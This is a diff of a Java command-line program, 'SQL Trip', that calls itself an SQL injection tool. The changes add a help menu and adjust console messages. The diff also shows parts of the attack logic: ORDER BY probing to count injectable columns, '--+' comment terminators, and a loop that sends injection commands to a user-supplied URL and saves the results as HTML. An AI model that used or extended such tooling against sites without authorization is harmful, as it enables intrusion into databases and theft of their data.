@@ -1,6 +1,6 @@
 import java.io.*;
 import java.net.*;
-class sql_trip extends ConsoleColors
+class sql_trip_errorhtmlremoved_and_orderby_function_with_consolecolors28thmarch extends ConsoleColors
 {
 public static void main(String [] args)throws Exception
 {
@@ -24,6 +24,7 @@ System.out.println(" default port is " + url.getDefaultPort());
 System.out.println(" query is " + url.getQuery());
 System.out.println(" ref is " + url.getRef());
 System.out.println("\n Press Author/A/Auth in the choice to see coder info...");
+System.out.println(ConsoleColors.GREEN_BOLD+"\n Press Help/H/h in the choice to see HELP MENU..."+ConsoleColors.RESET);
 System.out.print("\n\n Do you want to start SQL Trip to make an adventurous journey through the site ?? [yes/no/Y/N] (Default is no) : ");
 String choice;
 choice=br.readLine();choice=choice.trim();
@@ -33,8 +34,7 @@ System.out.print("\n\n Starting SQL Trip...Please wait... ");
 Thread.sleep(2000);
 System.out.print("\n\n Started...\n\n");
 int vulncolscount=orderbyclausecheck(url);
-System.out.print(ConsoleColors.CYAN_BOLD+"\n\n\n\n\t THERE ARE "+vulncolscount+" VULNERABLE COLUMNS \n\n"+ConsoleColors.RESET);
-System.out.print(ConsoleColors.PURPLE_BRIGHT+"\n\n\n PERFORMING SQL Injection \n\n"+ConsoleColors.RESET);
+System.out.print(ConsoleColors.CYAN_BOLD+"\n\n\n\n THERE ARE "+vulncolscount+" VULNERABLE COLUMNS"+ConsoleColors.RESET);
 Thread.sleep(3000);
 String urlworkwith=url.toString();
 String s=urlworkwith; String end="--+";String s1="";
@@ -88,7 +88,7 @@ s1="";
 indexcounter++;
 }//end of else
 if(k==(sql_commands.length)-1)
-{ System.out.print(ConsoleColors.GREEN_BOLD+"\n SQLTrip Ended.. Check Generated HTML Files named \"urlsqltrip_result\" indexed as 0,1,2,... in the same Directory..\n\n\n"+ConsoleColors.RESET);}
+{ System.out.print(ConsoleColors.GREEN_BOLD+"\n Program Ended.. Check Generated HTML Files named \"urlsqltrip_result\" indexed as 0,1,2,... in the same Directory..\n\n\n"+ConsoleColors.RESET);}
 }
 
 
@@ -98,7 +98,10 @@ if(k==(sql_commands.length)-1)
 else if(choice.equalsIgnoreCase("author")||choice.equals("a")||choice.equals("A")||choice.equalsIgnoreCase("auth"))
 {
 authorinfo(); }
-else { System.out.print(ConsoleColors.RED_BOLD+"\n\n SQL Trip not started... Exiting..Program Stopped..\n\n\n"+ConsoleColors.RESET); 
+else if(choice.equalsIgnoreCase("help")||choice.equals("H")||choice.equals("h")||choice.equalsIgnoreCase("hlp"))
+{
+helpmenu(); }
+else { System.out.print(ConsoleColors.RED_BOLD+"\n\n SQL Trip not started...Terminated by User...Exiting...Program Stopped...\n\n\n"+ConsoleColors.RESET); 
 Thread.sleep(1500);
 System.exit(0);}
 }
@@ -131,8 +134,10 @@ public static String input()throws Exception
 String inputuu="";
 boolean flag=false;
 BufferedReader br=new BufferedReader(new InputStreamReader(System.in));
+System.out.print(ConsoleColors.CYAN+"\n (Confused ? Just Type http://xyz.xyz --> Press Enter --> Type help in next menu)"+ConsoleColors.RESET);
 while(flag==false)
-{System.out.print(ConsoleColors.BLUE_BOLD+"\n\n Enter URL followed by parameter :\t"+ConsoleColors.RESET);
+{
+System.out.print(ConsoleColors.BLUE_BOLD+"\n\n Enter URL followed by parameter :\t"+ConsoleColors.RESET);
 int count=0;
 String b ="";
 inputuu=br.readLine();
@@ -160,6 +165,24 @@ BufferedReader br=new BufferedReader(new InputStreamReader(System.in));
 br.readLine();
 main(new String[0]);
 }
+public static void helpmenu()throws Exception
+{
+System.out.print("\f");
+System.out.print(ConsoleColors.YELLOW_BOLD+"\n\t\t\t\t\t========================================"+ConsoleColors.RESET);
+System.out.print("\n\t\t\t\t\tThis is SQL Trip... A SQL Injection Tool ");
+System.out.print(ConsoleColors.YELLOW_BOLD+"\n\t\t\t\t\t========================================\n"+ConsoleColors.RESET);
+System.out.print("\n \n HELP :-");
+System.out.print("\n \n This is SQL Trip.");
+System.out.print("\n \n Enter URL followed by parameter :");
+System.out.print("\n Here write the complete HTTP URL of the site you want to perform SQL Injection.");
+System.out.print("\n Valid Injectable parameter is necessary for appropriate results of Injection.");
+System.out.print("\n \n Then Just Press \"Y\". Sit back and enjoy SQL Trip doing its work... ");
+System.out.print("\n \n After Program Stops, Check for html files generated in the same directory."); 
+System.out.print("\n \n \n\n Press Enter To go to Main Program... \n\n ||||||||||||||||||||||||||||||||||||| \t");
+BufferedReader br=new BufferedReader(new InputStreamReader(System.in));
+br.readLine();
+main(new String[0]);
+}
 public static int orderbyclausecheck(URL urltocheckobyclause)throws Exception
 {
 boolean flag=false;
@@ -168,7 +191,7 @@ String s=urlworkwith; String end="--+";
 String c,d;
 c=s+" order by ";
 int count=1;
-System.out.print(ConsoleColors.PURPLE_BOLD+"\n\n SQL Trip CHECKING FOR VULNERABLE COLUMNS "+ConsoleColors.RESET);
+System.out.print(ConsoleColors.PURPLE_BOLD+"\n\n\n SQL Trip CHECKING FOR VULNERABLE COLUMNS "+ConsoleColors.RESET);
 
 while(flag==false)
 {
